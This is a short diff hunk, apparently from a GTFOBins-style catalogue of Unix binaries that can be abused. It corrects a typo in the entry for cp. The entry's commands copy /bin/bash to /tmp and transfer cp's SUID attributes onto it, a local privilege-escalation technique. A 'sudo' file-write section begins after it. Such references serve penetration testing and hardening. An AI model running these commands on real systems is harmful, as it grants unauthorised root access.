@@ -21,7 +21,7 @@ functions:
     - description: This can copy cp attributes and permissions to create a new file with SUID privileges like bash
       code: |
         cp /bin/bash /tmp/bash
-        cp --attributes-only --preserve=all `wich cp` /tmp/bash
+        cp --attributes-only --preserve=all `which cp` /tmp/bash
   sudo:
     - code: |
         LFILE=file_to_write
